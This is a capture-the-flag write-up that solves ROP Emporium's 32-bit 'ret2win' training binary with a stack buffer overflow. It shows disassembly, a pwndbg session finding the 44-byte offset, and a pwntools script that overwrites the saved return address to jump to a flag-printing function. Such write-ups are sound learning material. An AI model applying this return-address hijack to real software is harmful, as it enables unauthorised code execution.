---
title: "ret2win [ROP Emporium]"
date: 2018-05-20 00:00:06 +0530
categories:
  - Write-ups
header:
  teaser: "https://i.imgur.com/FJ8LnvR.png"
tags:
  - ROPEmporium
  - ROP
excerpt: "Writeup for ret2win, problems in the ROP Emporium Problem Set"
---
Here's the [problem link](https://ropemporium.com/challenge/ret2win.html).  
Here are the provided binaries:
[32bit](/assets/write-ups/ropemporium/ret2win/ret2win32), [64bit](/assets/write-ups/ropemporium/ret2win/ret2win)



```
Locate a method within the binary that you want to call and do so by
overwriting a saved return address on the stack.
```

Seems pretty easy.  
Since this chal is pretty straightforward, let's
start with the 32 bit one.
`objdump` tells us there is a `ret2win` function:
{% highlight nasm%}
080485f6 <pwnme>:
 80485f6:       55                      push   ebp
 80485f7:       89 e5                   mov    ebp,esp
 80485f9:       83 ec 28                sub    esp,0x28
 80485fc:       83 ec 04                sub    esp,0x4
                            ...
 8048653:       83 c4 10                add    esp,0x10
 8048656:       90                      nop
 8048657:       c9                      leave
 8048658:       c3                      ret

08048659 <ret2win>:
 8048659:       55                      push   ebp
 804865a:       89 e5                   mov    ebp,esp
 804865c:       83 ec 08                sub    esp,0x8
 804865f:       83 ec 0c                sub    esp,0xc
 8048662:       68 24 88 04 08          push   0x8048824
 8048667:       e8 94 fd ff ff          call   8048400 <printf@plt>
 804866c:       83 c4 10                add    esp,0x10
 804866f:       83 ec 0c                sub    esp,0xc
 8048672:       68 41 88 04 08          push   0x8048841
 8048677:       e8 b4 fd ff ff          call   8048430 <system@plt>
 804867c:       83 c4 10                add    esp,0x10
 804867f:       90                      nop
 8048680:       c9                      leave
 8048681:       c3                      ret
{% endhighlight %}

This is basically a `cat flag.txt` which needs to be jumped to.  
Let's run this:
```console
$ ./ret2win32
ret2win by ROP Emporium
32bits

For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;
What could possibly go wrong?
You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!

>
```

Let's do it:

<!--![](/assets/write-ups/ropemporium/ret2win/pwndbg.png)-->

{% highlight nasm%}
$ pwndbg ./ret2win32
Reading symbols from ./ret2win32...(no debugging symbols found)...done.
pwndbg: loaded 177 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
pwndbg> cyclic 50
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama
pwndbg> r
Starting program: /home/kunal/Documents/CTF/ROPEMporiumAgain/ret2win/32bit/ret2win32
ret2win by ROP Emporium
32bits

For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;
What could possibly go wrong?
You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!

> aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama

Program received signal SIGSEGV, Segmentation fault.
0x6161616c in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────
 EAX  0xffffc8e0 ◂— 0x61616161 ('aaaa')
 EBX  0x0
 ECX  0xf7f8889c ◂— 0x0
 EDX  0xffffc8e0 ◂— 0x61616161 ('aaaa')
 EDI  0xf7f87000 ◂— 0x1d9d6c
 ESI  0xf7f87000 ◂— 0x1d9d6c
 EBP  0x6161616b ('kaaa')
 ESP  0xffffc910 —▸ 0xf7fe006d ◂— jge    0xf7fe0077
 EIP  0x6161616c ('laaa')
──────────────────────────────────────────[ DISASM ]───────────────────────────────────────────
Invalid address 0x6161616c






───────────────────────────────────────────[ STACK ]───────────────────────────────────────────
00:0000│ esp  0xffffc910 —▸ 0xf7fe006d ◂— jge    0xf7fe0077
01:0004│      0xffffc914 —▸ 0xffffc930 ◂— 0x1
02:0008│      0xffffc918 ◂— 0x0
03:000c│      0xffffc91c —▸ 0xf7dc7b41 (__libc_start_main+241) ◂— add    esp, 0x10
04:0010│      0xffffc920 —▸ 0xf7f87000 ◂— 0x1d9d6c
... ↓
06:0018│      0xffffc928 ◂— 0x0
07:001c│      0xffffc92c —▸ 0xf7dc7b41 (__libc_start_main+241) ◂— add    esp, 0x10
─────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────
 ► f 0 6161616c
Program received signal SIGSEGV (fault address 0x6161616c)
pwndbg>

{% endhighlight %}

Find the offset to overwrite the saved `eip`:

```console
cyclic -l 0x6161616c
44
```

And write the corresponding address of our `ret2win` function (`0x08048659`) after the 44 byte padding:

{% highlight python %}
from pwn import *
context.update(arch='i386', os='linux')

binary = './ret2win32'
elf = ELF(binary)

win = elf.functions['ret2win'].address


with open('solve.txt', 'w') as f:
    f.write(cyclic(44))
    f.write(p32(win))

# p = process(binary)
# p.send(cyclic(44) + p32(win))
# p.interactive()
{% endhighlight %}

And finally get the flag:

```console
$ ./ret2win32 < solve.txt
ret2win by ROP Emporium
32bits

For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;
What could possibly go wrong?
You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!

> Thank you! Here's your flag:ROPE{a_placeholder_32byte_flag!}
zsh: segmentation fault (core dumped)  ./ret2win32 < solve.txt
```

The 64bit version can be easily solved by simply changing the padding to
`40` and updating the `ret2win`'s address.
